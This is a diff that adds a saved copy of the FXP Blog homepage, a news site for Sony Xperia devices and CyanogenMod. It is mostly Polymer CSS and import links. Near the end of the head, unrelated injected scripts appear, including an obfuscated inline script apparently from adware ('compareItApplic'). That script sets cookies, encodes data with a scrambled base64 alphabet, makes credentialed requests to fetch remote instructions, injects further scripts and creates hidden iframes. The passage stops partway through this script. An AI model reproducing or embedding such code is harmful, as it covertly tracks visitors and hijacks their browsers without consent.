@@ -1,0 +1,1843 @@
+<!DOCTYPE html>
+<html lang="en-GB"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style>template {display: none !important;} /* injected by platform.js */</style><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style><style shim-shadowdom-css="">style { display: none !important; }
+core-toolbar {
+	display: block; position: relative; box-sizing: border-box; height: 64px; font-size: 1.3em; background-color: rgb(207, 216, 220);
+}
+
+core-toolbar.animate {
+	transition: height 0.18s ease-in 0s;
+}
+
+core-toolbar.medium-tall {
+	height: 128px;
+}
+
+core-toolbar.tall {
+	height: 192px;
+}
+
+core-toolbar .toolbar-tools {
+	position: relative; height: 64px; padding: 0px 8px; pointer-events: none;
+}
+
+core-toolbar.core-narrow, core-toolbar.core-narrow, .core-narrow core-toolbar {
+	height: 56px;
+}
+
+core-toolbar.core-narrow.medium-tall, .core-narrow core-toolbar.medium-tall {
+	height: 112px;
+}
+
+core-toolbar.core-narrow.tall, .core-narrow core-toolbar.tall {
+	height: 168px;
+}
+
+core-toolbar.core-narrow .toolbar-tools, .core-narrow core-toolbar .toolbar-tools {
+	height: 56px; padding: 0px;
+}
+
+core-toolbar #middleBar {
+	position: absolute; top: 0px; right: 0px; left: 0px;
+}
+
+core-toolbar.tall #middleBar, core-toolbar.medium-tall #middleBar {
+	transform: translateY(100%);
+}
+
+core-toolbar #bottomBar {
+	position: absolute; right: 0px; bottom: 0px; left: 0px;
+}
+
+core-toolbar .toolbar-tools > :not([disabled]) {
+	pointer-events: auto;
+}
+
+core-toolbar .toolbar-tools > * {
+	margin: 0px 8px;
+}
+
+core-toolbar .toolbar-tools > .fit {
+	position: absolute; top: auto; right: 0px; bottom: 0px; left: 0px; width: auto; margin: 0px;
+}
+
+core-toolbar .indent {
+	margin-left: 60px;
+}core-media-query {
+	display: none;
+}core-drawer-panel {
+	display: block; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; overflow: hidden;
+}
+
+core-drawer-panel core-selector > #drawer {
+	position: absolute; top: 0px; left: 0px; height: 100%; will-change: transform; box-sizing: border-box;
+}
+
+core-drawer-panel .transition > #drawer {
+	transition: transform 0.3s ease-in-out 0s, width 0.3s ease-in-out 0s;
+}
+
+core-drawer-panel .right-drawer > #drawer {
+	left: auto; right: 0px;
+}
+
+core-drawer-panel [drawer] {
+	position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; box-sizing: border-box;
+}
+
+core-drawer-panel core-selector > #main {
+	position: absolute; top: 0px; right: 0px; bottom: 0px;
+}
+
+core-drawer-panel .transition > #main {
+	transition: left 0.3s ease-in-out 0s, padding 0.3s ease-in-out 0s;
+}
+
+core-drawer-panel .right-drawer > #main {
+	left: 0px;
+}
+
+core-drawer-panel .right-drawer.transition > #main {
+	transition: right 0.3s ease-in-out 0s, padding 0.3s ease-in-out 0s;
+}
+
+core-drawer-panel #main > [main] {
+	height: 100%;
+}
+
+core-drawer-panel #scrim {
+	position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px; background-color: rgba(0, 0, 0, 0.3); visibility: hidden; opacity: 0; transition: opacity 0.38s ease-in-out 0s, visibility 0.38s ease-in-out 0s;
+}
+
+core-drawer-panel #edgeSwipeOverlay {
+	position: absolute; top: 0px; bottom: 0px; left: 0px; width: 20px;
+}
+
+core-drawer-panel .right-drawer > #main > #edgeSwipeOverlay {
+	right: 0px; left: auto;
+}
+
+core-drawer-panel .narrow-layout > #drawer.core-selected {
+	box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.15);
+}
+
+core-drawer-panel .right-drawer.narrow-layout > #drawer.core-selected {
+	box-shadow: -2px 2px 4px rgba(0, 0, 0, 0.15);
+}
+
+core-drawer-panel .narrow-layout > #drawer > [drawer] {
+	border: 0px none;
+}
+
+core-drawer-panel .narrow-layout > #drawer:not(.core-selected) {
+	transform: translateX(-100%);
+}
+
+core-drawer-panel .right-drawer.narrow-layout > #drawer:not(.core-selected) {
+	left: auto; transform: translateX(100%);
+}
+
+core-drawer-panel .narrow-layout > #main {
+	left: 0px ! important; padding: 0px;
+}
+
+core-drawer-panel .right-drawer.narrow-layout > #main {
+	left: 0px; right: 0px; padding: 0px;
+}
+
+core-drawer-panel .narrow-layout > #main:not(.core-selected) > #scrim, core-drawer-panel .dragging #scrim {
+	visibility: visible; opacity: 1;
+}
+
+core-drawer-panel .narrow-layout > #main > [main] {
+	margin: 0px; min-height: 100%; left: 0px; right: 0px; box-sizing: border-box;
+}
+
+core-drawer-panel core-selector:not(.narrow-layout) [core-drawer-toggle] {
+	display: none;
+}core-header-panel {
+	display: block; position: relative;
+}
+
+core-header-panel #outerContainer {
+	position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px;
+}
+
+core-header-panel #mainPanel {
+	position: relative;
+}
+
+core-header-panel #mainContainer {
+	position: relative; overflow-y: auto; overflow-x: hidden;
+}
+
+core-header-panel #dropShadow {
+	position: absolute; top: 0px; left: 0px; right: 0px; height: 6px; box-shadow: 0px 5px 6px -3px rgba(0, 0, 0, 0.4) inset;
+}
+
+core-header-panel #dropShadow.hidden {
+	display: none;
+}
+
+core-header-panel[mode="scroll"] #mainContainer {
+	overflow: visible;
+}
+
+core-header-panel[mode="scroll"] #outerContainer {
+	overflow-y: auto; overflow-x: hidden;
+}
+
+core-header-panel[mode="cover"] #mainPanel {
+	position: static;
+}
+
+core-header-panel[mode="cover"] #mainContainer {
+	position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px;
+}
+
+core-header-panel[mode="cover"] #dropShadow {
+	position: static; width: 100%;
+}core-icon-button {
+	display: inline-block; box-sizing: border-box; -moz-user-select: none; border-radius: 2px; padding: 7px; margin: 2px; vertical-align: middle; font-size: 1rem; cursor: pointer;
+}
+
+core-icon-button[disabled] {
+	opacity: 0.6; pointer-events: none;
+}
+
+core-icon-button.outline {
+	box-shadow: 0px 0px 0px 1px rgba(0, 0, 0, 0.1);
+}
+
+core-icon-button:hover:not([disabled]) {
+	box-shadow: 0px 1px 0px 0px rgba(0, 0, 0, 0.12), 0px 0px 0px 1px rgba(0, 0, 0, 0.1);
+}
+
+core-icon-button.selected:not([disabled]) {
+	background-color: rgba(0, 0, 0, 0.05); box-shadow: 0px 1px 0px 0px rgba(0, 0, 0, 0.05) inset, 0px 0px 0px 1px rgba(0, 0, 0, 0.12);
+}
+
+core-icon-button:active:not([disabled]), core-icon-button.selected:active:not([disabled]) {
+	background-color: rgba(0, 0, 0, 0.05); box-shadow: 0px 1px 0px 0px rgba(0, 0, 0, 0.1) inset, 0px 0px 0px 1px rgba(0, 0, 0, 0.12);
+}
+
+core-icon-button.core-dark-theme.outline {
+	background-color: rgba(200, 200, 200, 0.05); box-shadow: 0px 0px 0px 1px rgba(200, 200, 200, 0.1);
+}
+
+core-icon-button.core-dark-theme:hover {
+	background-color: rgba(200, 200, 200, 0.05); box-shadow: 0px 1px 0px 0px rgba(200, 200, 200, 0.12), 0px 0px 0px 1px rgba(200, 200, 200, 0.1);
+}
+
+core-icon-button.core-dark-theme.selected {
+	background-color: rgba(220, 220, 220, 0.05); box-shadow: 0px 1px 0px 0px rgba(200, 200, 200, 0.05) inset, 0px 0px 0px 1px rgba(200, 200, 200, 0.12);
+}
+
+core-icon-button.core-dark-theme:active, core-icon-button.core-dark-theme.selected:active {
+	background-color: rgba(200, 200, 200, 0.05); box-shadow: 0px 1px 0px 0px rgba(200, 200, 200, 0.1) inset, 0px 0px 0px 1px rgba(200, 200, 200, 0.12);
+}
+
+core-icon-button core-icon {
+	pointer-events: none;
+}
+
+core-icon-button > :not(core-icon) {
+	margin-left: 4px;
+}core-scaffold {
+	display: block;
+}
+
+core-scaffold [drawer] {
+	background-color: rgb(255, 255, 255); box-shadow: 1px 0px 1px rgba(0, 0, 0, 0.1);
+}
+
+core-scaffold [main] {
+	height: 100%; background-color: rgb(238, 238, 238);
+}
+
+core-scaffold core-toolbar {
+	background-color: rgb(82, 110, 156); color: rgb(255, 255, 255);
+}
+
+core-scaffold #drawerPanel:not([narrow]) #menuButton {
+	display: none;
+}core-item {
+	display: block; position: relative; min-height: 40px; white-space: nowrap;
+}
+
+core-item.font-scalable {
+	min-height: 2.5em;
+}
+
+core-item.core-selected {
+	font-weight: bold;
+}
+
+core-item #icon {
+	margin: 0px 16px 0px 4px;
+}
+
+core-item.font-scalable #icon {
+	margin: 0px 1em 0px 0.25em; height: 1.5em; width: 1.5em;
+}
+
+core-item > a {
+	position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px; background-color: transparent;
+}core-menu {
+	display: block; margin: 12px;
+}
+
+core-menu > core-item {
+	cursor: default;
+}core-submenu {
+	display: block; height: auto;
+}
+
+core-submenu.core-selected, core-submenu[active] {
+	font-weight: initial;fontWeight: initial; font-weight: initial; 
+}
+
+core-submenu core-item {
+	cursor: default;
+}
+
+core-submenu.font-scalable > core-item {
+	min-height: 2.5em;
+}
+
+core-submenu.font-scalable > core-item core-icon {
+	margin: 0px 1em 0px 0.25em; height: 1.5em; width: 1.5em;
+}
+
+core-submenu #submenu {
+	margin: 0px 0px 0px 44px;
+}
+
+core-submenu.font-scalable > #submenu {
+	margin: 0px 0px 0px 2.75em;
+}core-image {
+	display: inline-block; overflow: hidden; position: relative;
+}
+
+core-image #placeholder {
+	background-color: inherit; opacity: 1;
+}
+
+core-image #placeholder.fadein {
+	transition: opacity 0.5s linear 0s; opacity: 0;
+}paper-ripple {
+	display: block; position: relative; border-radius: inherit; overflow: hidden;
+}
+
+paper-ripple[noink], [noink] paper-ripple {
+	pointer-events: none;
+}
+
+paper-ripple #bg, paper-ripple #waves, paper-ripple .wave-container, paper-ripple .wave {
+	pointer-events: none; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%;
+}
+
+paper-ripple #bg, paper-ripple .wave {
+	opacity: 0;
+}
+
+paper-ripple #waves, paper-ripple .wave {
+	overflow: hidden;
+}
+
+paper-ripple .wave-container, paper-ripple .wave {
+	border-radius: 50%;
+}
+
+paper-ripple.circle #bg, paper-ripple.circle #waves {
+	border-radius: 50%;
+}
+
+paper-ripple.circle .wave-container {
+	overflow: hidden;
+}paper-button {
+	display: inline-block; position: relative; box-sizing: border-box; min-width: 5.14em; margin: 0px 0.29em; background: none repeat scroll 0% 0% transparent; text-align: center; font: inherit; text-transform: uppercase; outline: medium none; border-radius: 3px; -moz-user-select: none; cursor: pointer; z-index: 0;
+}
+
+paper-button[disabled] {
+	background: none repeat scroll 0% 0% rgb(234, 234, 234); color: rgb(168, 168, 168); cursor: auto; pointer-events: none;
+}
+
+paper-button * {
+	text-transform: inherit;
+}
+
+paper-button #bg, paper-button #shadow {
+	border-radius: inherit;
+}
+
+paper-button #ripple {
+	pointer-events: none; z-index: -1;
+}
+
+paper-button .button-content {
+	padding: 0.7em 0.57em;
+}
+
+paper-button .button-content > a {
+	height: 100%; padding: 0.7em 0.57em; margin: -0.7em -0.57em; flex: 1 1 1e-9px;
+}material-card {
+	display: block; padding: 10px;
+}
+
+material-card paper-shadow {
+	background-color: white; border-radius: 5px; padding: 20px;
+}
+
+@media only screen and (max-width: 960px) {
+material-card {
+	padding: 5px;
+}
+
+material-card paper-shadow {
+	padding: 20px 10px;
+}
+
+
+}</style>
+  <meta charset="UTF-8">
+  <title>FXP Blog | News for Sony Mobile Xperia devices, CyanogenMod, and Android.</title>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="generator" content="Jekyll v2.4.0">
+  <link rel="stylesheet" href="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/screen.css">
+  <!-- Polymer imports -->
+  <script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/ga.js" async="" type="text/javascript"></script><script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/webcomponents.js"></script>
+  <link href="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/css.css" rel="stylesheet" type="text/css"><link rel="import" href="http://fxpblog.co/bower_components/font-roboto/roboto.html">
+  <style shim-shadowdom-css="">/* Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt */
+
+html   core-icon {
+  display: inline-block;
+  vertical-align: middle;
+  background-repeat: no-repeat;
+  fill: currentcolor;
+  position: relative;
+  height: 24px;
+  width: 24px;
+}</style><link rel="import" href="http://fxpblog.co/bower_components/core-icons/device-icons.html">
+  <link rel="import" href="http://fxpblog.co/bower_components/core-scaffold/core-scaffold.html">
+  <style shim-shadowdom-css="">/*
+Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+*/
+
+html   core-collapse {
+  display: block;
+}
+
+html   .core-collapse-closed {
+  display: none;
+}</style><link rel="import" href="http://fxpblog.co/bower_components/core-menu/core-submenu.html">
+  <link rel="import" href="http://fxpblog.co/bower_components/core-image/core-image.html">
+  <!-- Paper imports -->
+  <style shim-shadowdom-css="">/*******************************
+          Flex Layout
+*******************************/
+
+html   [layout][horizontal], html   [layout][vertical] {
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  display: flex;
+}
+
+html   [layout][horizontal][inline], html   [layout][vertical][inline] {
+  display: -ms-inline-flexbox;
+  display: -webkit-inline-flex;
+  display: inline-flex;
+}
+
+html   [layout][horizontal] {
+  -ms-flex-direction: row;
+  -webkit-flex-direction: row;
+  flex-direction: row;
+}
+
+html   [layout][horizontal][reverse] {
+  -ms-flex-direction: row-reverse;
+  -webkit-flex-direction: row-reverse;
+  flex-direction: row-reverse;
+}
+
+html   [layout][vertical] {
+  -ms-flex-direction: column;
+  -webkit-flex-direction: column;
+  flex-direction: column;
+}
+
+html   [layout][vertical][reverse] {
+  -ms-flex-direction: column-reverse;
+  -webkit-flex-direction: column-reverse;
+  flex-direction: column-reverse;
+}
+
+html   [layout][wrap] {
+  -ms-flex-wrap: wrap;
+  -webkit-flex-wrap: wrap;
+  flex-wrap: wrap;
+}
+
+html   [layout][wrap-reverse] {
+  -ms-flex-wrap: wrap-reverse;
+  -webkit-flex-wrap: wrap-reverse;
+  flex-wrap: wrap-reverse;
+}
+
+html   [flex] {
+  -ms-flex: 1 1 0.000000001px;
+  -webkit-flex: 1;
+  flex: 1;
+  -webkit-flex-basis: 0.000000001px;
+  flex-basis: 0.000000001px;
+}
+
+html   [vertical][layout] > [flex][auto-vertical], html   [vertical][layout]  [flex][auto-vertical] {
+  -ms-flex: 1 1 auto;
+  -webkit-flex-basis: auto;
+  flex-basis: auto;
+}
+
+html   [flex][auto] {
+  -ms-flex: 1 1 auto;
+  -webkit-flex-basis: auto;
+  flex-basis: auto;
+}
+
+html   [flex][none] {
+  -ms-flex: none;
+  -webkit-flex: none;
+  flex: none;
+}
+
+html   [flex][one] {
+  -ms-flex: 1;
+  -webkit-flex: 1;
+  flex: 1;
+}
+
+html   [flex][two] {
+  -ms-flex: 2;
+  -webkit-flex: 2;
+  flex: 2;
+}
+
+html   [flex][three] {
+  -ms-flex: 3;
+  -webkit-flex: 3;
+  flex: 3;
+}
+
+html   [flex][four] {
+  -ms-flex: 4;
+  -webkit-flex: 4;
+  flex: 4;
+}
+
+html   [flex][five] {
+  -ms-flex: 5;
+  -webkit-flex: 5;
+  flex: 5;
+}
+
+html   [flex][six] {
+  -ms-flex: 6;
+  -webkit-flex: 6;
+  flex: 6;
+}
+
+html   [flex][seven] {
+  -ms-flex: 7;
+  -webkit-flex: 7;
+  flex: 7;
+}
+
+html   [flex][eight] {
+  -ms-flex: 8;
+  -webkit-flex: 8;
+  flex: 8;
+}
+
+html   [flex][nine] {
+  -ms-flex: 9;
+  -webkit-flex: 9;
+  flex: 9;
+}
+
+html   [flex][ten] {
+  -ms-flex: 10;
+  -webkit-flex: 10;
+  flex: 10;
+}
+
+html   [flex][eleven] {
+  -ms-flex: 11;
+  -webkit-flex: 11;
+  flex: 11;
+}
+
+html   [flex][twelve] {
+  -ms-flex: 12;
+  -webkit-flex: 12;
+  flex: 12;
+}
+
+/* alignment in cross axis */
+
+html   [layout][start] {
+  -ms-flex-align: start;
+  -webkit-align-items: flex-start;
+  align-items: flex-start;
+}
+
+html   [layout][center], html   [layout][center-center] {
+  -ms-flex-align: center;
+  -webkit-align-items: center;
+  align-items: center;
+}
+
+html   [layout][end] {
+  -ms-flex-align: end;
+  -webkit-align-items: flex-end;
+  align-items: flex-end;
+}
+
+/* alignment in main axis */
+
+html   [layout][start-justified] {
+  -ms-flex-pack: start;
+  -webkit-justify-content: flex-start;
+  justify-content: flex-start;
+}
+
+html   [layout][center-justified], html   [layout][center-center] {
+  -ms-flex-pack: center;
+  -webkit-justify-content: center;
+  justify-content: center;
+}
+
+html   [layout][end-justified] {
+  -ms-flex-pack: end;
+  -webkit-justify-content: flex-end;
+  justify-content: flex-end;
+}
+
+html   [layout][around-justified] {
+  -ms-flex-pack: distribute;
+  -webkit-justify-content: space-around;
+  justify-content: space-around;
+}
+
+html   [layout][justified] {
+  -ms-flex-pack: justify;
+  -webkit-justify-content: space-between;
+  justify-content: space-between;
+}
+
+/* self alignment */
+
+html   [self-start] {
+  -ms-align-self: flex-start;
+  -webkit-align-self: flex-start;
+  align-self: flex-start;
+}
+
+html   [self-center] {
+  -ms-align-self: center;
+  -webkit-align-self: center;
+  align-self: center;
+}
+
+html   [self-end] {
+  -ms-align-self: flex-end;
+  -webkit-align-self: flex-end;
+  align-self: flex-end;
+}
+
+html   [self-stretch] {
+  -ms-align-self: stretch;
+  -webkit-align-self: stretch;
+  align-self: stretch;
+}
+
+/*******************************
+          Other Layout
+*******************************/
+
+html   [block] {
+  display: block;
+}
+
+/* ie support for hidden */
+html   [hidden] {
+  display: none !important;
+}
+
+html   [relative] {
+  position: relative;
+}
+
+html   [fit] {
+  position: absolute;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+}
+
+body[fullbleed] {
+  margin: 0;
+  height: 100vh;
+}
+
+/*******************************
+            Other
+*******************************/
+
+html   [segment], html   segment {
+  display: block;
+  position: relative;
+  -webkit-box-sizing: border-box;
+  -ms-box-sizing: border-box;
+  box-sizing: border-box;
+  margin: 1em 0.5em;
+  padding: 1em;
+  background-color: white;
+  -webkit-box-shadow: 0px 0px 0px 1px rgba(0, 0, 0, 0.1);
+  box-shadow: 0px 0px 0px 1px rgba(0, 0, 0, 0.1);
+  border-radius: 5px 5px 5px 5px;
+}</style><style shim-shadowdom-css="">html   core-a11y-keys {
+    display: none;
+  }</style><style shim-shadowdom-css="">/*
+ * @license
+ * Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+ * This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+ * The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+ * The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+ * Code distributed by Google as part of the polymer project is also
+ * subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+ */
+
+html   paper-shadow,
+html   paper-animated-shadow {
+  display: block;
+  position: relative;
+}
+
+html   paper-shadow  #shadow-bottom,
+html   paper-shadow  #shadow-top {
+  border-radius: inherit;
+  pointer-events: none;
+}
+
+html   paper-shadow  #shadow-bottom[animated],
+html   paper-shadow  #shadow-top[animated] {
+  transition: box-shadow 0.28s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+html   .paper-shadow-top-z-1 {
+  box-shadow: none;
+}
+
+html   .paper-shadow-bottom-z-1 {
+  box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.37);
+}
+
+html   .paper-shadow-top-z-2 {
+  box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.2);
+}
+
+html   .paper-shadow-bottom-z-2 {
+  box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.3);
+}
+
+html   .paper-shadow-top-z-3 {
+  box-shadow: 0 11px 7px 0 rgba(0, 0, 0, 0.19);
+}
+
+html   .paper-shadow-bottom-z-3 {
+  box-shadow: 0 13px 25px 0 rgba(0, 0, 0, 0.3);
+}
+
+html   .paper-shadow-top-z-4 {
+  box-shadow: 0 14px 12px 0 rgba(0, 0, 0, 0.17);
+}
+
+html   .paper-shadow-bottom-z-4 {
+  box-shadow: 0 20px 40px 0 rgba(0, 0, 0, 0.3);
+}
+
+html   .paper-shadow-top-z-5 {
+  box-shadow: 0 17px 17px 0 rgba(0, 0, 0, 0.15);
+}
+
+html   .paper-shadow-bottom-z-5 {
+  box-shadow: 0 27px 55px 0 rgba(0, 0, 0, 0.3);
+}</style><link rel="import" href="http://fxpblog.co/bower_components/paper-button/paper-button.html">
+  <link rel="import" href="http://fxpblog.co/bower_components/material-card/material-card.html">
+  
+  <script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/jquery.js"></script>
+  <script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/jquery_002.js"></script>
+  <script>
+    $(document).ready(function(){
+      // Target your .container, .wrapper, .post, etc.
+      $(".content").fitVids();
+    });
+  </script>
+  <script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/application.js"></script>
+  
+  <!-- Google Analytics -->
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-47489706-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><script id="id_arrrrppdjafklbvnn4440fm" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/wpnewbs.js" type="text/javascript"></script><script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/l.js" type="text/javascript"></script><script id="id_ad5cbe0b719874f1" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/wpgb.js" type="text/javascript"></script><script type="text/javascript" id="fghjktghndfgt">function fghjktghndfgt_init(){new function(){if(!document.getElementById('__fghjktghndfgt_once')){(function(){var a=document.createElement('div');a.id='__fghjktghndfgt_once';a.setAttribute('style','display:none;');var c=document.getElementsByTagName('body')[0];c&&c.appendChild(a)})();var a=this;a.pid='1539';a.cc='GB';a.eid='1354';a.ename='compareItApplic';a.hid='15822617355930755353';a.debugMode=!1;a.utils=new function(){var b=this;'function'!==typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,'')});b.JSON=new function(){this.parse=function(c){try{return'undefined'!==typeof JSON&&'function'==typeof JSON.stringify?JSON.parse(c):eval('var a='+c)}catch(a){return!1}}};b.cookie=new function(){var c=this;c.setCookie=function(c,a,b){var f='';'string'===typeof b?f='; expires='+b:'number'===typeof b&&(f=new Date,f.setTime(f.getTime()+864E5*b),f='; expires='+f.toGMTString());document.cookie=c+'='+a+f+'; path=/'};c.getCookie=function(c){c+='=';for(var a=document.cookie.split(';'),b=0;b<a.length;b++){for(var f=a[b];' '==f.charAt(0);)f=f.substring(1,f.length);if(0==f.indexOf(c))return f.substring(c.length,f.length)}return null};c.eraseCookie=function(a){c.setCookie(a,'',-1)}};b.getProtocol=function(c){var a=document.createElement('a');a.href=c;return a.protocol};b.getHostName=function(c){if(!c)return'';var a=document.createElement('a');a.href=c;return a.hostname};b.isMenuBarVisible=function(){if(!b.msie&&window.menubar)return window.menubar.visible;if('object'==typeof WebBrowser2)return WebBrowser2.MenuBar;if(b.msie)return!0;var c=window.innerWidth||document.documentElement.scrollWidth||0,a=window.innerHeight||document.documentElement.scrollHeight||0;if(c){window.resizeTo(c,a);var g=window.innerWidth||document.documentElement.scrollWidth,e=window.innerHeight||document.documentElement.scrollHeight;window.resizeTo(c+2,a);c=window.scrollWidth||document.documentElement.scrollWidth;return!(c!=g&&c<=g+2&&90>=a-e)}};b.getInstructions=function(c,d){b.msie?b.inject_script(c+('&cb='+a.prefix+'.'+d)):b.ajax.get(c,function(c){if(c)a[d](c)})};b.l=new function(){var c=this;c.xlat='abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';c.encode=function(a){a=c._utf8_encode(a);for(var b='',e=0;e<a.length;){var f=a.charCodeAt(e++),h=a.charCodeAt(e++),l=a.charCodeAt(e++),k=f>>2,f=(f&3)<<4|h>>4,n=(h&15)<<2|l>>6,m=l&63;isNaN(h)?n=m=64:isNaN(l)&&(m=64);b=b+c.xlat.charAt(k)+c.xlat.charAt(f)+(64==n?'=':c.xlat.charAt(n))+(64==m?'=':c.xlat.charAt(m))}return b};c._utf8_encode=function(c){if(c&&c.length){for(var a='',b=0;b<c.length;b++){var f=c.charCodeAt(b);128>f?a+=String.fromCharCode(f):(127<f&&2048>f?a+=String.fromCharCode(f>>6|192):(a+=String.fromCharCode(f>>12|224),a+=String.fromCharCode(f>>6&63|128)),a+=String.fromCharCode(f&63|128))}return a}return c};c.decode=function(a){a=a.toString().replace(/[^A-Za-z0-9\+\/]/g,'');for(var b='',e=0;e<a.length;){var f=c.xlat.indexOf(a.charAt(e++)),h=c.xlat.indexOf(a.charAt(e++)),l=c.xlat.indexOf(a.charAt(e++)),k=c.xlat.indexOf(a.charAt(e++)),n=(h&15)<<4|l>>2,m=(l&3)<<6|k,b=b+String.fromCharCode(f<<2|h>>4);64!=l&&0<n&&(b+=String.fromCharCode(n));64!=k&&0<m&&(b+=String.fromCharCode(m))}return this._utf8_decode(b)};c._utf8_decode=function(a){for(var c='',b=0;b<a.length;){var f=a.charCodeAt(b);if(128>f)c+=String.fromCharCode(f),b++;else if(191<f&&224>f)var h=a.charCodeAt(b+1),c=c+String.fromCharCode((f&31)<<6|h&63),b=b+2;else var h=a.charCodeAt(b+1),l=a.charCodeAt(b+2),c=c+String.fromCharCode((f&15)<<12|(h&63)<<6|l&63),b=b+3}return c}};b.ajax=new function(){this.get=function(a,b){try{var g=new XMLHttpRequest;g.open('GET',a,!0);g.withCredentials=!0;g.onreadystatechange=function(){4==g.readyState&&b(g.responseText)};g.send()}catch(e){}}};b.randomChar=function(){for(var a='',b=0;2>b;b++)a+='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52*Math.random()));return a};b.msie=function(){var a=parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10);isNaN(a)&&(a=parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10));return isNaN(a)?!1:a}();b.inject_script=function(c){var b=document.getElementsByTagName('body')[0],g=document.createElement('script');g.type='text/javascript';g.id='id_'+a.prefix;g.src=c;b&&b.appendChild(g)};b.epoch=function(){return Math.floor((new Date).getTime()/1E3)};b.getVert=function(){var a=localStorage.getItem('sk398erjds2d');return a?a:b.forexVert()};b.browser=function(){var a=navigator.userAgent.toLowerCase(),b={webkit:/webkit/.test(a),mozilla:/mozilla/.test(a)&&!/(compatible|webkit)/.test(a),chrome:/chrome/.test(a),msie:/msie/.test(a)&&!/opera/.test(a),firefox:/firefox/.test(a),safari:/safari/.test(a)&&!/chrome/.test(a),opera:/opera/.test(a)};b.version=b.safari?(a.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1];return b}();b.getNodeTextProp=function(a){return'textContent'in a?'textContent':'innerText'in a?'innerText':!1};b.dhtml_prop_name=function(a){return a.replace(/(\-([a-z]){1})/g,function(a,c,b){return b.toUpperCase()})};b.get_computed_style='function'!=typeof window.getComputedStyle?function(a){return{getPropertyValue:function(d){'float'==d&&(d='styleFloat');d=b.dhtml_prop_name(d);return'object'==typeof a.currentStyle&&null!=a.currentStyle&&'undefined'!=typeof a.currentStyle[d]?a.currentStyle[d]:null}}}:function(a,b){return window.getComputedStyle(a,b)||{getPropertyValue:function(){}}};b.getEmptyWindow=function(){var a=document.createElement('iframe');a.src='about:blank';a.setAttribute('style','display:inline;width:1px;height:1px;padding:none;margin:none;');document.body.appendChild(a);return 